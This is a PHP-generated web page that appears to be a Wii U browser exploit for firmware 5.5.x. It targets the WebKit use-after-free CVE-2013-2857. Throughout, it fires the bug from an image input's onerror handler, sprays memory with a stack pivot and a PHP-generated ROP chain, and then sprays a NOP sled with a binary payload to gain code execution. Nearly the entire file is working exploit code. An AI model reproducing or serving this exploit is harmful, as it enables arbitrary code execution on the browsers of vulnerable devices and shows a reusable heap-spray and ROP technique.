<?php
//Useful function
function hexentities($str) {
	$return = '';
	for($i = 0; $i < strlen($str); $i++) {
		$return .= '0x'.bin2hex(substr($str, $i, 1)).', ';
	}
	return $return;
}

// Settings
$_REQUEST['sysver'] = '550'; // Currently hardcoded.
$payload_size = 0x8000;
$pivotAdressAdress       = 0x1B800000; //r6
$payload_srcaddr = 0x1D600000;
$ROPHEAP = $payload_srcaddr + 0x800000;
$ROPCHAIN_JS_VAR = 1;

$USE_FIXED_PAYLOAD_LEGNTH = 0x400000; // This may be useless, but it worked once.. soo..

/**
 Expects a wiiuhaxx_common_cfg.php with the following variables
 
$wiiuhaxxcfg_payloadfilepath = "code550.bin"; // The actual payload that will be loaded.
$wiiuhaxxcfg_loaderfilepath = "wiiuhaxx_common/wiiuhaxx_loader.bin";
**/
require_once("wiiuhaxx_common/wiiu_browserhax_common.php");
?>

<!--
Tested on 5.5.1
CVE-2013-2857
Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
Result: Bug is present, crash
-->
<script>
function UaF(a)
{
	function arrayBufferConsoleAsHex( buffer, callback ) {
		var blob = new Blob([buffer],{type:'application/octet-binary'});
		var reader = new FileReader();
		reader.onload = function(evt){
			var dataurl = evt.target.result;
			callback(base64ToBase16(dataurl.substr(dataurl.indexOf(',')+1)));
		};
		reader.readAsDataURL(blob);
	}
	
	function base64ToBase16(base64) {
		return window.atob(base64)
			  .split('')
			  .map(function (aChar) {
				return ('0' + aChar.charCodeAt(0).toString(16)).slice(-2);
			  })
			 .join('')
			 .toUpperCase(); // Per your example output
	}
	
    //Warning, the delta was modified !
    var delta                   = 0x0<!--#echo var="delta" -->000000; //from 0x0 to 0x04000000 step by 0x01000000
    var pivotAdress             = 0x010ADDCC;
    //5.5.2
    {
        var pivotAdressAdress       = 0x1B800000; //r6
        var payloadAdress           = 0x1D600000 + delta;
    }

    var codegenAddress          = 0x01800000;
    var sizeWebCoreImageLoader  = 0x18;
    var sprayCount              = 0x1900;
    var _4K                     = 0x1000;
    var _16K                    = 0x4000;
    var _32K                    = 0x8000;

    //radio is the *ONLY* type that left the freed WebCore::ImageLoader free !
    a.type="radio";

    //Allocate this new WebCore::ImageLoader over freed WebCore::
    var ab = new ArrayBuffer(sizeWebCoreImageLoader);
    var dv = new DataView(ab)
    /*
    0:000:x86> dt webkit!WebCore::ImageLoader
       +0x000 __VFN_table : Ptr32
       +0x004 m_client         : Ptr32 WebCore::ImageLoaderClient
       +0x008 m_image          : WebCore::CachedResourceHandle<WebCore::CachedImage>
       +0x00c m_failedLoadURL  : WTF::AtomicString
       +0x010 m_hasPendingBeforeLoadEvent : Pos 0, 1 Bit
       +0x010 m_hasPendingLoadEvent : Pos 1, 1 Bit
       +0x010 m_hasPendingErrorEvent : Pos 2, 1 Bit
       +0x010 m_imageComplete  : Pos 3, 1 Bit
       +0x010 m_loadManually   : Pos 4, 1 Bit
       +0x010 m_elementIsProtected : Pos 5, 1 Bit
    */
    //Register:r3 Adress:0x1AF35330-0x1AF35360
    dv.setUint32(0x00, 0x00000000);         //vtable
    dv.setUint32(0x04, pivotAdressAdress);  //m_client
    dv.setUint32(0x08, pivotAdressAdress);  //m_image
    dv.setUint32(0x0C, 0x00000000);         //m_failedLoadURL
    dv.setUint32(0x10, 0x00000000);         //m_hasPendingBeforeLoadEvent
    dv.setUint32(0x14, 0x00000000);         //padding
	
    //Rop helper
    
	var ropCurrentDv = null;
	var ropCurrentOffset = 0;

	function ropchain_appendu8(val){
		ropCurrentDv.setUint8(ropCurrentOffset, val);
		ropCurrentOffset += 1;
	}
    

    //Spray large ArrayBuffer with pivotAdress
    //Middle range 0x1B100000
    var ar = new Array(0x1800);
    for(var i=0; i<0x1800; i++){
        ar[i] = new DataView(new ArrayBuffer(_4K));
        for(var j=0; j<_4K; j+=4){
            ar[i].setUint32(j, 0x10000000+j); //filler
        }

        ar[i].setUint32(0x204, 0x0);
        ar[i].setUint32(0x018, pivotAdressAdress);
        ar[i].setUint32(0x000, pivotAdressAdress+0x20);
        ar[i].setUint32(0x2BC, pivotAdress); //lwz r0, 0x4(r11) ; mtlr r0 ; mr r1, r11 ; li r3, -0x1 ; blr ;
        //r11, new stack location
        ar[i].setUint32(0x208, pivotAdressAdress+0x300);

        //initialize this Rop Chain
        ropCurrentDv = ar[i];
        ropCurrentOffset = 0x304;
		
		var ropPrintStart = ropCurrentOffset;

        //start of the Rop Chain
		<?php
			// This php function generates the ROP and places it into the global variable $ROPCHAIN
			generate_ropchain();
			echo $ROPCHAIN; // creates "var realROPChain = [...];" when "$ROPCHAIN_JS_VAR = 1;"
		?>
        realROPChain.forEach(function(element) {
		  ropchain_appendu8(element);
		});
		
		//arrayBufferConsoleAsHex(ar[i].buffer.slice(ropPrintStart,ropCurrentOffset), console.log.bind(console));
    }

    //Spray final payload
    //Middle range 0x1C9E0000
	var ar2 = new Array(sprayCount);
    for(var i=0; i<sprayCount; i++){
		 ar2[i] = new Uint8Array(
		 	<?php
			$payload = wiiuhaxx_generatepayload();
			// Place a bunch of nops before our actual payload so the total size is 0x4000 bytes.
			echo "[";
			for($iNop = 0;$iNop<(0x4000-strlen($payload))/4;$iNop++){
				echo " 0x60, 0x00, 0x00, 0x00,"; // nop
			}
			echo hexentities($payload) . "]";
			?>
		 );		
    }
	
	//arrayBufferConsoleAsHex(ar2[0].buffer.slice(0x0,0x4000), console.log.bind(console)); 

    //alert("wait...");

    //Use the new WebCore::ImageLoader & pivot !
    return 0;
}
</script>

<input id="x" type="image" onerror="UaF(this);" src=""/>
